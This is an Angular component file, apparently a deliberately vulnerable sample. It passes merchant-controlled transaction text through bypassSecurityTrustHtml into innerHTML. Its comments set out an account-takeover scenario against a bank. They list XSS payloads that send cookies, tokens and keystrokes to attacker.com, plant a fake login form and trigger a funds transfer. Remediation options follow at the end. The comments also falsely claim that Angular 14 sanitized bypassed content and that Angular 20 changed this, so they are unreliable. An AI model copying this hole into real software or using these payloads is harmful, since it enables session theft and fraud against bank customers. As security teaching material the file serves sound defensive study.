import { Component, Input, OnInit } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

/**
 * TransactionDescriptionComponent
 *
 * Displays rich-formatted merchant transaction descriptions with HTML styling.
 * Uses DomSanitizer.bypassSecurityTrustHtml() to allow bold/italic formatting
 * in merchant names like "<b>Starbucks</b> #2847".
 *
 * SECURITY VULNERABILITY:
 * The merchantDescription input comes from the payment processor and is merchant-controlled.
 * Merchants set their display name when registering with Visa/Mastercard/etc.
 *
 * Angular 14 behavior:
 * - bypassSecurityTrustHtml() bypasses Angular's sanitizer
 * - However, Angular 14's sanitizer still provides some XSS protection even for bypassed content
 * - Script tags are stripped in most cases
 *
 * Angular 20 behavior (WITHOUT strict CSP):
 * - bypassSecurityTrustHtml() content is fully subject to page CSP
 * - If CSP is misconfigured (e.g., includes 'unsafe-inline' or is absent), XSS payloads execute
 * - Angular 20 relies on CSP for security, not internal sanitizer logic
 *
 * EXPLOITATION SCENARIO:
 * 1. Attacker registers merchant account with name:
 *    "<img src=x onerror='fetch(\"https://attacker.com?cookie=\"+document.cookie)'>"
 * 2. Makes $1 purchase to target customer's BofA account
 * 3. Customer views transaction history
 * 4. This component calls bypassSecurityTrustHtml() on malicious merchant name
 * 5. In Angular 20 without strict CSP: img onerror executes, session cookie exfiltrated
 * 6. Attacker uses stolen session for account takeover
 *
 * PAYLOADS THAT WOULD EXECUTE IN ANGULAR 20 (without strict CSP):
 * - <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
 * - <svg onload="document.location='https://attacker.com?t='+localStorage.authToken">
 * - <iframe srcdoc="<script>parent.postMessage(document.cookie,'*')</script>"></iframe>
 * - <style>@import'javascript:alert(document.cookie)';</style>
 * - <b onmouseover="eval(atob('malicious_base64_payload'))">Hover me</b>
 */
@Component({
  selector: 'app-transaction-description',
  template: `
    <div class="transaction-description">
      <!-- SECURITY ISSUE: innerHTML binding with bypassed sanitization -->
      <div [innerHTML]="safeDescription" class="merchant-name"></div>
      <div class="transaction-details">
        <span class="amount">{{ amount | currency }}</span>
        <span class="date">{{ date | date }}</span>
      </div>
    </div>
  `,
  styles: [`
    .transaction-description {
      padding: 12px;
      border-bottom: 1px solid #e0e0e0;
    }
    .merchant-name {
      font-size: 16px;
      margin-bottom: 4px;
      /* Merchant-controlled HTML is rendered here - XSS risk */
    }
    .transaction-details {
      display: flex;
      justify-content: space-between;
      font-size: 14px;
      color: #666;
    }
  `]
})
export class TransactionDescriptionComponent implements OnInit {
  @Input() merchantDescription!: string;
  @Input() amount!: number;
  @Input() date!: string;

  safeDescription!: SafeHtml;

  constructor(private sanitizer: DomSanitizer) {}

  ngOnInit(): void {
    // SECURITY VULNERABILITY: Bypassing Angular's built-in XSS protection
    //
    // This line is the root cause of the XSS window after Angular 20 migration.
    //
    // In Angular 14:
    // - bypassSecurityTrustHtml() tells Angular "I trust this content"
    // - Angular 14's sanitizer still provides fallback protection
    // - Script tags are generally stripped even when bypassed
    //
    // In Angular 20:
    // - Angular relies on Content Security Policy (CSP) for XSS prevention
    // - bypassSecurityTrustHtml() content is NOT sanitized by Angular
    // - If CSP is not configured to block inline scripts, XSS payloads execute
    //
    // THE CRITICAL MISTAKE:
    // merchantDescription is MERCHANT-CONTROLLED (not user-controlled, but still untrusted).
    // Merchants can inject XSS payloads when registering with payment processor.
    //
    // REAL-WORLD XSS PAYLOAD EXAMPLES (would execute in Angular 20 without CSP):
    //
    // 1. Cookie theft via img onerror:
    //    "<img src=x onerror='fetch(\"https://attacker.com?c=\"+document.cookie)'>"
    //
    // 2. Session token exfiltration:
    //    "<svg onload='navigator.sendBeacon(\"https://attacker.com\",localStorage.authToken)'>"
    //
    // 3. Credential harvesting via fake login form:
    //    "<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999'>"
    //    + "<form action='https://attacker.com/phish' method='POST'>"
    //    + "Session expired. Re-enter password: <input type='password' name='pwd'><button>Login</button>"
    //    + "</form></div>"
    //
    // 4. Keylogger injection:
    //    "<img src=x onerror='document.onkeypress=e=>fetch(\"https://attacker.com?key=\"+e.key)'>"
    //
    // 5. Account takeover via API abuse:
    //    "<img src=x onerror='fetch(\"/api/transfer\",{method:\"POST\",body:JSON.stringify({to:\"attacker\",amount:10000})})'>"
    //
    this.safeDescription = this.sanitizer.bypassSecurityTrustHtml(this.merchantDescription);

    // REGULATORY IMPACT for Bank of America (59M users):
    // - GLBA (Gramm-Leach-Bliley Act) requires incident disclosure
    // - OCC (Office of the Comptroller of the Currency) reporting within 36 hours
    // - Potential penalties: up to $1M per violation
    // - Customer notification requirements for affected accounts
    // - Mandatory cybersecurity examination by regulators
  }

  /**
   * CORRECT MIGRATION APPROACH:
   *
   * Option 1 (RECOMMENDED): Remove bypass, add server-side sanitization
   * ----------------------------------------------------------------
   * // Backend API sanitizes merchantDescription with DOMPurify (allow only <b>, <i>, <em>)
   * // Frontend uses Angular's built-in sanitizer:
   * template: `<div [innerHTML]="merchantDescription"></div>`
   * // No bypassSecurityTrustHtml() needed - Angular sanitizes safely
   *
   * Option 2: Keep bypass but add STRICT CSP
   * -----------------------------------------
   * // Configure CSP header (server or meta tag):
   * Content-Security-Policy: script-src 'self' 'nonce-{random}'; object-src 'none'; base-uri 'self';
   * // This prevents all inline script execution, even if bypassed by Angular
   *
   * Option 3: Render as plain text with CSS
   * ----------------------------------------
   * template: `<div class="merchant-name">{{ merchantDescription }}</div>`
   * // No HTML rendering at all - safest option but loses formatting
   *
   * TESTING REQUIREMENT:
   * After migration, integration test must verify XSS payloads are blocked:
   * - Test with <script>alert(1)</script>
   * - Test with <img src=x onerror="alert(1)">
   * - Test with <svg onload="alert(1)">
   * - Verify CSP violation appears in browser console (not script execution)
   */
}
